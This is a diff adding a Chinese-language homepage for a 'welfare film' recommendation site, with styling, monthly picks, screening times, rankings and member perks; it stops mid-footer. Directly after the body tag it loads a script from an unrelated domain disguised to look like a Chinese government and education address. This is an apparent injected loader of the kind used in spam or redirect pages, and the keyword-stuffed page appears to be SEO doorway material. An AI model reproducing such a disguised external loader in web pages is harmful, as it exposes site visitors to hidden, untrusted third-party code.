@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>霸气福利电影网 - 霸气福利电影推荐、福利片单与高清观影指南</title>
+<meta name="description" content="霸气福利电影网(https://baqifulidianyingwang-wap.github.io)专注霸气福利电影推荐，涵盖福利片单、高分佳片、限时放映与观影福利，为影迷提供每月精选观影指南。">
+<meta name="keywords" content="霸气福利电影网,霸气福利电影,福利电影推荐,福利片单,高清电影,观影福利,霸气电影">
+<meta name="author" content="霸气福利电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="霸气福利电影网 - 霸气福利电影推荐与观影福利">
+<meta property="og:description" content="专注霸气福利电影推荐，涵盖福利片单、高分佳片与限时放映，每月精选观影指南。">
+<meta property="og:url" content="https://baqifulidianyingwang-wap.github.io/">
+<meta property="og:site_name" content="霸气福利电影网">
+<link rel="canonical" href="https://baqifulidianyingwang-wap.github.io/">
+<style>
+:root{
+  --bg:#100909;
+  --bg2:#160e0e;
+  --card:#1d1414;
+  --crimson:#8b1a1a;
+  --crimson2:#b22222;
+  --red:#d62828;
+  --gold:#c9a24a;
+  --gold2:#e6c46b;
+  --ink:#f2e8e0;
+  --ink2:#cbb8ad;
+  --muted:#8a7368;
+  --line:#332222;
+  --line2:#4a3333;
+  --sans:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  --serif:"Source Han Serif SC","Songti SC","SimSun",Georgia,serif;
+  --martial:"STKaiti","Kaiti SC","KaiTi",serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--ink);font-family:var(--sans);line-height:1.85;-webkit-font-smoothing:antialiased;background-image:radial-gradient(circle at 50% 0,rgba(178,34,34,.14),transparent 45%),radial-gradient(circle at 50% 100%,rgba(60,10,10,.6),transparent 50%)}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+.btn{display:inline-block;padding:14px 34px;font-size:13px;font-weight:900;letter-spacing:3px;cursor:pointer;border:none;transition:.25s;background:linear-gradient(135deg,var(--red),var(--crimson));color:#fff;font-family:var(--sans);position:relative}
+.btn:hover{filter:brightness(1.15)}
+.btn.ghost{background:transparent;border:1px solid var(--gold);color:var(--gold)}
+.btn.ghost:hover{background:var(--gold);color:#100909}
+
+/* ===== 顶部信息条 ===== */
+.topbar{background:#0a0606;border-bottom:1px solid var(--line);font-size:12px;color:var(--muted);padding:10px 0}
+.topbar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.topbar a{color:var(--ink2)}
+.topbar a:hover{color:var(--gold2)}
+.topbar .hot{color:var(--red);font-weight:800}
+
+/* ===== 报头 ===== */
+header{border-bottom:4px solid var(--crimson);background:linear-gradient(180deg,rgba(139,26,26,.16),transparent);padding:44px 0 30px}
+.masthead{text-align:center;position:relative}
+.masthead .seal{display:inline-grid;place-items:center;width:64px;height:64px;margin:0 auto 16px;border:2px solid var(--gold);border-radius:50%;font-family:var(--martial);font-size:26px;color:var(--gold);background:rgba(201,162,74,.08)}
+.masthead h1{font-family:var(--martial);font-size:58px;font-weight:900;letter-spacing:6px;color:var(--ink);line-height:1.2}
+.masthead h1 a{color:var(--ink)}
+.masthead h1 a:hover{color:var(--gold2)}
+.masthead .sub{font-size:13px;letter-spacing:10px;color:var(--gold);text-transform:uppercase;margin-top:14px}
+.masthead .slogan{font-family:var(--serif);font-size:16px;color:var(--ink2);margin-top:16px;font-style:italic}
+.masthead .slogan b{color:var(--gold2)}
+.metabar{display:flex;justify-content:center;gap:36px;margin-top:22px;font-size:12px;color:var(--muted);flex-wrap:wrap}
+.metabar span b{color:var(--gold2);font-family:var(--serif);font-size:15px}
+
+/* ===== 导航 ===== */
+nav{background:var(--bg2);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+nav .wrap{display:flex;gap:0;overflow-x:auto;padding:0;scrollbar-width:none}
+nav .wrap::-webkit-scrollbar{display:none}
+nav a{padding:16px 24px;font-size:13.5px;font-weight:800;letter-spacing:2px;color:var(--ink2);white-space:nowrap;transition:.2s;border-bottom:2px solid transparent}
+nav a:hover,nav a.active{color:var(--gold2);border-bottom-color:var(--red);background:rgba(178,34,34,.07)}
+
+/* ===== 通用 ===== */
+section{padding:76px 0;position:relative}
+.kicker{font-size:11px;letter-spacing:4px;color:var(--red);text-transform:uppercase}
+.sec-head{display:flex;justify-content:space-between;align-items:flex-end;gap:24px;flex-wrap:wrap;margin-bottom:48px;border-bottom:1px solid var(--line);padding-bottom:20px}
+.sec-head .t h2{font-family:var(--martial);font-size:32px;font-weight:900;letter-spacing:3px;color:var(--ink);margin-top:8px}
+.sec-head .t h2 em{font-style:normal;color:var(--gold2)}
+.sec-head .sub{font-size:14px;color:var(--muted);max-width:540px;text-align:right}
+.view-all{text-align:center;margin-top:46px}
+
+/* ===== Hero 王座区 ===== */
+.hero{display:grid;grid-template-columns:1.15fr 1fr;gap:0;border:1px solid var(--line);border-radius:2px;overflow:hidden;background:var(--card);position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:linear-gradient(135deg,transparent 60%,rgba(178,34,34,.12));pointer-events:none}
+.hero .main{padding:48px 44px;position:relative;border-right:1px solid var(--line)}
+.hero .main .tag{display:inline-block;font-size:11px;letter-spacing:3px;color:#fff;background:var(--crimson);padding:5px 16px;margin-bottom:24px}
+.hero .main h2{font-family:var(--martial);font-size:30px;font-weight:900;line-height:1.6;color:var(--ink);letter-spacing:2px}
+.hero .main h2 a:hover{color:var(--gold2)}
+.hero .main h2 em{font-style:normal;color:var(--gold2)}
+.hero .main p{font-size:15px;color:var(--ink2);margin-top:18px;max-width:520px}
+.hero .main .stats{display:flex;gap:0;margin-top:30px;border:1px solid var(--line)}
+.hero .main .stats div{flex:1;padding:16px 12px;text-align:center;border-right:1px solid var(--line)}
+.hero .main .stats div:last-child{border-right:none}
+.hero .main .stats b{display:block;font-family:var(--serif);font-size:26px;font-weight:900;color:var(--gold2)}
+.hero .main .stats span{font-size:11.5px;color:var(--muted);letter-spacing:1px}
+.hero .side{display:flex;flex-direction:column}
+.hero .side .row{padding:16px 26px;border-bottom:1px solid var(--line);transition:.2s;display:flex;gap:16px;align-items:baseline}
+.hero .side .row:last-child{border-bottom:none}
+.hero .side .row:hover{background:rgba(178,34,34,.08)}
+.hero .side .row .r{font-family:var(--martial);font-size:22px;color:var(--red);flex-shrink:0;width:30px}
+.hero .side .row .t{font-size:14.5px;font-weight:700;color:var(--ink)}
+.hero .side .row .t small{display:block;font-size:11.5px;color:var(--muted);font-weight:400}
+
+/* ===== 栏目一：福利片单（四宫格 + 对角不对称） ===== */
+.grid4{display:grid;grid-template-columns:repeat(3,1fr);grid-auto-rows:minmax(200px,auto);gap:20px}
+.pick{grid-column:span 1;background:var(--card);border:1px solid var(--line);border-radius:2px;overflow:hidden;transition:.28s;display:flex;flex-direction:column}
+.pick:hover{border-color:var(--gold);transform:translateY(-5px)}
+.pick.wide{grid-column:span 2}
+.pick.tall{grid-row:span 2}
+.pick .cap{height:140px;position:relative;display:flex;flex-direction:column;justify-content:space-between;padding:16px}
+.pick.wide .cap{height:auto;min-height:200px}
+.pick.tall .cap{min-height:280px}
+.pick .cap .top{display:flex;justify-content:space-between;align-items:flex-start}
+.pick .cap .no{font-family:var(--martial);font-size:13px;color:var(--gold2);letter-spacing:2px}
+.pick .cap .ribbon{font-size:10px;letter-spacing:2px;background:var(--red);color:#fff;padding:4px 10px}
+.pick .cap .ttl{font-family:var(--martial);font-size:24px;font-weight:900;color:#fff;letter-spacing:2px;text-shadow:0 2px 8px rgba(0,0,0,.5)}
+.pick.wide .cap .ttl{font-size:30px}
+.pick .body{padding:18px 20px;flex:1;display:flex;flex-direction:column}
+.pick .body h4{font-family:var(--serif);font-size:17px;font-weight:900;color:var(--ink);line-height:1.5}
+.pick .body h4 a:hover{color:var(--gold2)}
+.pick .body p{font-size:13.5px;color:var(--ink2);margin-top:8px}
+.pick .body .bot{margin-top:auto;padding-top:14px;display:flex;justify-content:space-between;font-size:12px;color:var(--muted)}
+.pick .body .bot b{color:var(--gold2);font-family:var(--serif)}
+
+/* ===== 栏目二：限时放映（倒计时式时间轴） ===== */
+.tl{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:2px;overflow:hidden;background:var(--card)}
+.tl .left{padding:40px 36px;border-right:1px solid var(--line);background:linear-gradient(160deg,#241616,#160e0e)}
+.tl .left .count{font-family:var(--martial);font-size:72px;font-weight:900;color:var(--red);line-height:1}
+.tl .left .count small{font-size:16px;color:var(--muted);letter-spacing:2px;font-family:var(--sans)}
+.tl .left h3{font-family:var(--serif);font-size:20px;font-weight:900;color:var(--ink);margin:16px 0 12px}
+.tl .left p{font-size:14px;color:var(--ink2)}
+.tl .left .cd{display:flex;gap:10px;margin-top:26px}
+.tl .left .cd div{background:var(--bg2);border:1px solid var(--line2);border-radius:2px;text-align:center;padding:12px 6px;min-width:64px}
+.tl .left .cd b{display:block;font-family:var(--serif);font-size:26px;font-weight:900;color:var(--gold2)}
+.tl .left .cd span{font-size:10.5px;color:var(--muted);letter-spacing:1px}
+.tl .right{padding:0}
+.tl .right .node{display:flex;gap:18px;padding:20px 32px;border-bottom:1px solid var(--line);transition:.2s;align-items:flex-start}
+.tl .right .node:last-child{border-bottom:none}
+.tl .right .node:hover{background:rgba(178,34,34,.07)}
+.tl .right .node .time{flex-shrink:0;width:78px;font-family:var(--serif);font-size:18px;font-weight:900;color:var(--red);padding-top:2px}
+.tl .right .node .time small{display:block;font-size:11px;color:var(--muted);font-weight:400}
+.tl .right .node .c h4{font-family:var(--serif);font-size:16.5px;font-weight:900;color:var(--ink);line-height:1.5}
+.tl .right .node .c h4 a:hover{color:var(--gold2)}
+.tl .right .node .c p{font-size:13px;color:var(--ink2);margin-top:5px}
+.tl .right .node .c .flag{font-size:10.5px;letter-spacing:2px;color:var(--gold2);margin-top:6px}
+
+/* ===== 栏目三：高分榜单（横向条形） ===== */
+.ranks{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rank{background:var(--card);border:1px solid var(--line);border-radius:2px;padding:26px 28px}
+.rank h3{font-family:var(--martial);font-size:20px;font-weight:900;color:var(--ink);letter-spacing:2px;margin-bottom:22px;display:flex;align-items:center;gap:10px}
+.rank h3::before{content:"";width:5px;height:22px;background:var(--red)}
+.rk{display:flex;gap:16px;align-items:center;padding:12px 0;border-bottom:1px dashed var(--line);transition:.2s}
+.rk:last-child{border-bottom:none}
+.rk:hover{background:rgba(201,162,74,.06)}
+.rk .n{font-family:var(--martial);font-size:26px;font-weight:900;color:var(--line2);width:34px;flex-shrink:0;text-align:center}
+.rk:nth-child(2) .n{color:var(--gold2)}
+.rk:nth-child(3) .n{color:var(--ink2)}
+.rk .info{flex:1;min-width:0}
+.rk .info h4{font-family:var(--serif);font-size:15.5px;font-weight:900;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rk .info h4 a:hover{color:var(--gold2)}
+.rk .info span{font-size:12px;color:var(--muted)}
+.rk .sc{font-family:var(--serif);font-size:19px;font-weight:900;color:var(--red);flex-shrink:0}
+
+/* ===== 栏目四：观影福利（会员特权卡） ===== */
+.perks{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.perk{background:var(--card);border:1px solid var(--line);border-top:3px solid var(--crimson);border-radius:2px;padding:28px 24px;text-align:center;transition:.28s}
+.perk:hover{border-color:var(--gold);transform:translateY(-5px);background:var(--bg2)}
+.perk .ico{width:58px;height:58px;margin:0 auto 18px;display:grid;place-items:center;border:1px solid var(--line2);border-radius:50%;font-size:24px;color:var(--gold2);background:rgba(201,162,74,.08)}
+.perk h4{font-family:var(--martial);font-size:18px;font-weight:900;color:var(--ink);letter-spacing:1px;margin-bottom:10px}
+.perk p{font-size:13px;color:var(--ink2);min-height:60px}
+.perk .go{display:inline-block;margin-top:14px;font-size:11.5px;letter-spacing:2px;color:var(--red);border-bottom:1px solid var(--red);padding-bottom:2px}
+
+/* ===== 关于 ===== */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:44px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--red);border-radius:2px;padding:46px 44px;align-items:center}
+.about h2{font-family:var(--martial);font-size:30px;font-weight:900;letter-spacing:3px;color:var(--ink);margin-bottom:18px}
+.about h2 em{font-style:normal;color:var(--gold2)}
+.about p{font-size:15px;color:var(--ink2)}
+.about .cards{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.about .cards div{background:var(--bg2);border:1px solid var(--line);border-radius:2px;padding:22px;text-align:center}
+.about .cards b{display:block;font-family:var(--martial);font-size:30px;font-weight:900;color:var(--red);line-height:1}
+.about .cards span{font-size:12px;color:var(--muted);letter-spacing:1px}
+
+/* ===== 页脚 ===== */
+footer{background:#0a0606;border-top:4px solid var(--crimson);padding:56px 0 26px;margin-top:48px}
+.foot{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:36px}
+.foot .bl h4{font-family:var(--martial);font-size:26px;font-weight:900;color:var(--gold2);letter-spacing:3px}
+.foot .bl p{font-size:13.5px;color:var(--ink2);margin-top:14px;max-width:380px}
+.foot .bl .quote{margin-top:14px;font-family:var(--serif);font-size:14px;color:var(--gold2);font-style:italic}
+.foot h5{font-size:12.5px;font-weight:900;color:var(--red);margin-bottom:16px;letter-spacing:2px}
+.foot ul{list-style:none;font-size:13.5px}
+.foot li{padding:6px 0}
+.foot a{color:var(--ink2)}
+.foot a:hover{color:var(--gold2)}
+.copyright{margin-top:40px;border-top:1px solid var(--line);padding-top:22px;font-size:12.5px;color:var(--muted);text-align:center;line-height:2.2}
+.copyright a{color:var(--gold2);font-weight:700}
+
+/* ===== 响应式 ===== */
+@media (max-width:1000px){
+  .wrap{padding:0 18px}
+  .hero{grid-template-columns:1fr}
+  .hero .main{border-right:none;border-bottom:1px solid var(--line)}
+  .grid4{grid-template-columns:repeat(2,1fr)}
+  .pick.wide,.pick.tall{grid-column:span 1;grid-row:span 1}
+  .pick.tall .cap{min-height:140px}
+  .tl{grid-template-columns:1fr}
+  .tl .left{border-right:none;border-bottom:1px solid var(--line)}
+  .ranks,.about{grid-template-columns:1fr}
+  .perks{grid-template-columns:repeat(2,1fr)}
+  .foot{grid-template-columns:1fr 1fr;gap:30px}
+}
+@media (max-width:600px){
+  .masthead h1{font-size:34px;letter-spacing:2px}
+  .masthead .sub{font-size:11px;letter-spacing:5px}
+  .hero .main{padding:32px 22px}
+  .hero .main h2{font-size:22px}
+  .hero .main .stats{flex-wrap:wrap}
+  .hero .main .stats div{flex:1 1 50%;border-bottom:1px solid var(--line)}
+  .hero .side .row{padding:14px 20px}
+  nav a{padding:13px 16px;font-size:12.5px;letter-spacing:1px}
+  .sec-head .t h2{font-size:23px}
+  .sec-head .sub{text-align:left}
+  .grid4{grid-template-columns:1fr}
+  .tl .left{padding:32px 24px}
+  .tl .left .count{font-size:54px}
+  .tl .right .node{padding:16px 20px;gap:12px}
+  .tl .right .node .time{width:60px;font-size:15px}
+  .rank{padding:22px 20px}
+  .perks{grid-template-columns:1fr}
+  .about{padding:32px 24px}
+  .about .cards{grid-template-columns:1fr 1fr}
+  .foot{grid-template-columns:1fr}
+  section{padding:54px 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ============ 顶部信息条 ============ -->
+<div class="topbar">
+  <div class="wrap">
+    <span><span class="hot">★ 本月福利</span> 新用户领 30 天观影福利 · 每日限时放映 4 场 · 会员专享 4K 修复片单</span>
+    <span><a href="#perks">领福利</a> &nbsp;|&nbsp; <a href="#">登录</a> &nbsp;|&nbsp; <a href="#">注册</a> &nbsp;|&nbsp; <a href="#">APP下载</a></span>
+  </div>
+</div>
+
+<!-- ============ 报头 ============ -->
+<header>
+  <div class="wrap masthead">
+    <div class="seal">霸</div>
+    <h1><a href="https://baqifulidianyingwang-wap.github.io/" title="霸气福利电影网">霸气福利电影网</a></h1>
+    <div class="sub">BA QI FU LI · FILM</div>
+    <div class="slogan">霸气选片，<b>福利观影</b>——每月只留最值得看的，把最好的留给观众。</div>
+    <div class="metabar">
+      <span><b>11</b> 部本月精选</span>
+      <span><b>4</b> 档限时放映</span>
+      <span><b>8.6</b> 平均口碑</span>
+      <span>更新于 2026.10.07</span>
+    </div>
+  </div>
+</header>
+
+<!-- ============ 导航 ============ -->
+<nav>
+  <div class="wrap">
+    <a href="#picks" class="active">福利片单</a>
+    <a href="#timeline">限时放映</a>
+    <a href="#ranks">高分榜单</a>
+    <a href="#perks">观影福利</a>
+    <a href="#about">关于我们</a>
+    <a href="#">新片速递</a>
+    <a href="#">4K 修复</a>
+    <a href="#">霸气专题</a>
+    <a href="#">观影日历</a>
+  </div>
+</nav>
+
+<!-- ============ Hero 王座区 ============ -->
+<section style="padding-bottom:0;">
+  <div class="wrap hero">
+    <div class="main">
+      <span class="tag">本月主打 · FEATURE</span>
+      <h2><a href="#">霸气开场：<br>本月 <em>11</em> 部，<br>部部都是福利</a></h2>
+      <p>霸气福利电影网专注一件事：把当月海量片源筛成一份福利级片单。院线新片、流媒体独播、4K 修复与冷门遗珠，按口碑与观影场景排好序，让你不必再为「今晚看什么」纠结。</p>
+      <div class="stats">
+        <div><b>11</b><span>本月精选</span></div>
+        <div><b>4</b><span>限时场次</span></div>
+        <div><b>8.6</b><span>平均评分</span></div>
+        <div><b>0</b><span>广告打扰</span></div>
+      </div>
+    </div>
+    <div class="side">
+      <div class="row"><span class="r">壹</span><span class="t">本月霸气片单：11 部精选<small>院线 · 流媒体 · 修复 · 冷门 四维筛选</small></span></div>
+      <div class="row"><span class="r">贰</span><span class="t">限时放映：4 场倒计时专场<small>到点开映，错过等一周</small></span></div>
+      <div class="row"><span class="r">叁</span><span class="t">霸气专题：动作 · 史诗 · 群像<small>大场面爱好者专属</small></span></div>
+      <div class="row"><span class="r">肆</span><span class="t">观影福利：会员特权一览<small>免费领 · 专享价 · 积分兑换</small></span></div>
+      <div class="row"><span class="r">伍</span><span class="t">新片速递与观影日历<small>每周更新，不错过任何一场</small></span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目一：福利片单 ============ -->
+<section id="picks">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="t"><span class="kicker">// 壹 福利片单</span><h2>本月 <em>11</em> 部精选</h2></div>
+      <p class="sub">霸气福利电影网每月筛出的 11 部福利级片单，覆盖动作、史诗、悬疑、治愈等不同类型，附口碑评分与推荐理由。</p>
+    </div>
+    <div class="grid4">
+      <div class="pick wide">
+        <div class="cap" style="background:linear-gradient(135deg,#5a1a1a,#241010)">
+          <div class="top"><span class="no">霸气 NO.01</span><span class="ribbon">本月最强</span></div>
+          <div class="ttl">孤锋</div>
+        </div>
+        <div class="body"><h4><a href="#">孤锋</a></h4><p>一个人对抗一整座城的动作戏，实拍为主、特效为辅，是本月大场面与人物塑造最平衡的一部。</p><div class="bot"><span>动作 / 犯罪 · 118 min</span><b>8.9 分</b></div></div>
+      </div>
+      <div class="pick">
+        <div class="cap" style="background:linear-gradient(135deg,#4a2418,#241410)">
+          <div class="top"><span class="no">霸气 NO.02</span><span class="ribbon">口碑黑马</span></div>
+          <div class="ttl">十一重天</div>
+        </div>
+        <div class="body"><h4><a href="#">十一重天</a></h4><p>群像叙事下的权谋史诗，十一股势力交错，反转不靠巧合而靠人物选择。</p><div class="bot"><span>史诗 / 历史 · 142 min</span><b>8.7 分</b></div></div>
+      </div>
+      <div class="pick">
+        <div class="cap" style="background:linear-gradient(135deg,#3a2030,#1e1018)">
+          <div class="top"><span class="no">霸气 NO.03</span><span class="ribbon">限时放映</span></div>
+          <div class="ttl">沉默边境</div>
+        </div>
+        <div class="body"><h4><a href="#">沉默边境</a></h4><p>边境小城的走私案，节奏紧、信息准，是近期少见的硬派犯罪片。</p><div class="bot"><span>犯罪 / 悬疑 · 106 min</span><b>8.6 分</b></div></div>
+      </div>
+      <div class="pick">
+        <div class="cap" style="background:linear-gradient(135deg,#20303a,#101820)">
+          <div class="top"><span class="no">霸气 NO.04</span><span class="ribbon">治愈之选</span></div>
+          <div class="ttl">她与海</div>
+        </div>
+        <div class="body"><h4><a href="#">她与海</a></h4><p>两位女性的海岛重逢，不煽情不狗血，海景摄影与配乐是隐形的第三主角。</p><div class="bot"><span>爱情 / 治愈 · 103 min</span><b>8.4 分</b></div></div>
+      </div>
+      <div class="pick tall">
+        <div class="cap" style="background:linear-gradient(135deg,#2a2010,#1a1608)">
+          <div class="top"><span class="no">霸气 NO.05</span><span class="ribbon">霸气专题</span></div>
+          <div class="ttl">最后的<br>放映师</div>
+        </div>
+        <div class="body"><h4><a href="#">最后的放映师</a></h4><p>县城最后一家老影院要拆了，放映师决定办一场告别放映。笑点密集但不廉价，是本月最容易被低估的那部。</p><div class="bot"><span>喜剧 / 怀旧 · 112 min</span><b>8.1 分</b></div></div>
+      </div>
+      <div class="pick">
+        <div class="cap" style="background:linear-gradient(135deg,#1a2a20,#0e1a14)">
+          <div class="top"><span class="no">霸气 NO.06</span><span class="ribbon">冷门遗珠</span></div>
+          <div class="ttl">第十一页</div>
+        </div>
+        <div class="body"><h4><a href="#">第十一页</a></h4><p>一本会自己续写的小说，每一页打开都是新世界，视觉想象力本月最佳。</p><div class="bot"><span>动画 / 奇幻 · 94 min</span><b>8.5 分</b></div></div>
+      </div>
+      <div class="pick wide">
+        <div class="cap" style="background:linear-gradient(135deg,#4a1a1a,#241010)">
+          <div class="top"><span class="no">霸气 NO.07</span><span class="ribbon">候补位</span></div>
+          <div class="ttl">由你提名</div>
+        </div>
+        <div class="body"><h4><a href="#">第 11 部，留给读者</a></h4><p>每月留一个候补位，由读者留言提名，票数最高的那部会补进下月片单并附上短评。提名请说明片名与推荐理由。</p><div class="bot"><span>每月开放一次 · 票数前 3 公示</span><b>参与有礼</b></div></div>
+      </div>
+    </div>
+    <div class="view-all"><a href="#" class="btn ghost">查看完整福利片单 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 栏目二：限时放映 ============ -->
+<section id="timeline" style="background:var(--bg2);">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="t"><span class="kicker">// 贰 限时放映</span><h2>倒计时专场</h2></div>
+      <p class="sub">到点开映，错过等一周。四场限时放映均为修复版或独家版本，限免与会员专场交替安排。</p>
+    </div>
+    <div class="tl">
+      <div class="left">
+        <div class="count">04<small> 场即将开映</small></div>
+        <h3>本场距离开映还有</h3>
+        <div class="cd">
+          <div><b id="cd-d">02</b><span>天 DAY</span></div>
+          <div><b id="cd-h">11</b><span>时 HOUR</span></div>
+          <div><b id="cd-m">38</b><span>分 MIN</span></div>
+          <div><b id="cd-s">00</b><span>秒 SEC</span></div>
+        </div>
+        <p style="margin-top:22px;font-size:13px;color:var(--muted)">下一场：《十一重天》4K 修复版 · 群像史诗专场 · 限免 500 席<br><a href="#perks" style="color:var(--gold2);font-weight:700">领取限免资格 →</a></p>
+      </div>
+      <div class="right">
+        <div class="node"><div class="time">10.09<small>周五 20:00</small></div><div class="c"><h4><a href="#">《孤锋》动作专场</a></h4><p>实拍动作戏精华剪辑版，映后附 20 分钟幕后访谈</p><div class="flag">会员免费 · 限免 1000 席</div></div></div>
+        <div class="node"><div class="time">10.11<small>周日 19:30</small></div><div class="c"><h4><a href="#">《十一重天》4K 修复版</a></h4><p>群像史诗专场，修复版首次线上放映</p><div class="flag">限免 500 席 · 先到先得</div></div></div>
+        <div class="node"><div class="time">10.14<small>周三 21:00</small></div><div class="c"><h4><a href="#">《沉默边境》悬疑专场</a></h4><p>反转解析场，映前给出三条线索提示</p><div class="flag">会员专享</div></div></div>
+        <div class="node"><div class="time">10.16<small>周五 20:00</small></div><div class="c"><h4><a href="#">《她与海》治愈专场</a></h4><p>海岛主题夜，附配乐原声带歌单</p><div class="flag">免费开放 · 无需登录</div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目三：高分榜单 ============ -->
+<section id="ranks">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="t"><span class="kicker">// 叁 高分榜单</span><h2>口碑榜与热度榜</h2></div>
+      <p class="sub">截至 11 月的年度数据，分为口碑榜与热度榜，每月更新一次。</p>
+    </div>
+    <div class="ranks">
+      <div class="rank">
+        <h3>本月口碑榜</h3>
+        <div class="rk"><span class="n">1</span><div class="info"><h4><a href="#">孤锋</a></h4><span>动作 / 犯罪 · 118 min</span></div><span class="sc">8.9</span></div>
+        <div class="rk"><span class="n">2</span><div class="info"><h4><a href="#">十一重天</a></h4><span>史诗 / 历史 · 142 min</span></div><span class="sc">8.7</span></div>
+        <div class="rk"><span class="n">3</span><div class="info"><h4><a href="#">沉默边境</a></h4><span>犯罪 / 悬疑 · 106 min</span></div><span class="sc">8.6</span></div>
+        <div class="rk"><span class="n">4</span><div class="info"><h4><a href="#">第十一页</a></h4><span>动画 / 奇幻 · 94 min</span></div><span class="sc">8.5</span></div>
+        <div class="rk"><span class="n">5</span><div class="info"><h4><a href="#">她与海</a></h4><span>爱情 / 治愈 · 103 min</span></div><span class="sc">8.4</span></div>
+      </div>
+      <div class="rank">
+        <h3>本周热度榜</h3>
+        <div class="rk"><span class="n">1</span><div class="info"><h4><a href="#">十一重天</a></h4><span>群像史诗 · 话题度第一</span></div><span class="sc">98.6</span></div>
+        <div class="rk"><span class="n">2</span><div class="info"><h4><a href="#">孤锋</a></h4><span>实拍动作 · 口碑出圈</span></div><span class="sc">96.2</span></div>
+        <div class="rk"><span class="n">3</span><div class="info"><h4><a href="#">沉默边境</a></h4><span>反转话题 · 映后讨论热</span></div><span class="sc">93.8</span></div>
+        <div class="rk"><span class="n">4</span><div class="info"><h4><a href="#">最后的放映师</a></h4><span>怀旧治愈 · 二刷率高</span></div><span class="sc">90.5</span></div>
+        <div class="rk"><span class="n">5</span><div class="info"><h4><a href="#">她与海</a></h4><span>海岛治愈 · 配乐出圈</span></div><span class="sc">88.7</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目四：观影福利 ============ -->
+<section id="perks" style="background:var(--bg2);">
+  <div class="wrap">
+    <div class="sec-head">
+      <div class="t"><span class="kicker">// 肆 观影福利</span><h2>会员观影福利</h2></div>
+      <p class="sub">霸气福利电影网为观众准备的实在福利，免费领、专享价、积分兑换，每月更新一次。</p>
+    </div>
+    <div class="perks">
+      <div class="perk"><div class="ico">★</div><h4>新人礼包</h4><p>新注册即领 30 天观影福利，院线新片与修复片单均可使用。</p><a href="#" class="go">立即领取</a></div>
+      <div class="perk"><div class="ico">◉</div><h4>限免专场</h4><p>每周四场限时放映，修复版与独家版本交替安排，席位有限。</p><a href="#" class="go">查看场次</a></div>
+      <div class="perk"><div class="ico">◆</div><h4>专享折扣</h4><p>会员专享片单 7 折起，年度专享价低至 5 折，可叠加积分。</p><a href="#" class="go">查看价格</a></div>
+      <div class="perk"><div class="ico">●</div><h4>积分兑换</h4><p>每日签到与评论均可获积分，积分可兑换观影时长与周边。</p><a href="#" class="go">兑换中心</a></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 关于我们 ============ -->
+<section id="about" style="padding-bottom:0;">
+  <div class="wrap">
+    <div class="about">
+      <div>
+        <span class="kicker">// 关于我们</span>
+        <h2>关于 <em>霸气福利电影网</em></h2>
+        <p>霸气福利电影网（https://baqifulidianyingwang-wap.github.io）是一个只做「福利级片单」的选片平台。我们相信影迷真正缺的不是片源，而是有人愿意替他看完、筛完、排好序，再把最好的部分做成福利留给他。</p>
+        <p style="margin-top:12px;">每个月，我们按院线档期、流媒体上新、修复片单与冷门遗珠四个来源，筛出 11 部最值得看的电影，并附上口碑评分与一句选片理由，让你不必再为「今晚看什么」纠结。</p>
+      </div>
+      <div class="cards">
+        <div><b>11</b><span>部 / 每月精选</span></div>
+        <div><b>4</b><span>场 / 限时放映</span></div>
+        <div><b>8.6</b><span>平均口碑评分</span></div>
+        <div><b>0</b><span>广告打扰</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="bl">
+        <h4>霸气福利电影网</h4>
+        <p>每月精选 11 部福利级电影，含档期、口碑评分与选片理由。内容仅供观影参考与交流，影片信息以片方与院线官方公告为准，版权归原权利人所有。</p>
+        <div class="quote">「霸气选片，福利观影——把最好的留给观众。」</div>
+      </div>
+      <div>
+        <h5>栏目导航</h5>
+        <ul>
+          <li><a href="#picks">福利片单</a></li>
+          <li><a href="#timeline">限时放映</a></li>
+          <li><a href="#ranks">高分榜单</a></li>
+          <li><a href="#perks">观影福利</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>选片专题</h5>
+        <ul>
+          <li><a href="#">新片速递</a></li>
+          <li><a href="#">4K 修复</a></li>
+          <li><a href="#">霸气专题</a></li>
+          <li><a href="#">观影日历</a></li>
+          <li><a href="#">冷门遗珠</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于本站</h5>
+        <ul>
+          <li><a href="#about">网站介绍</a></li>
+          <li><a href="#">投稿与合作</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">隐私政策</a></li>
+          <li><a href="#">联系我们</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      © 2026 霸气福利电影网 baqifulidianyingwang-wap.github.io 版权所有 · 本站内容仅供观影参考与交流，影片版权归原作者及片方所有<br>
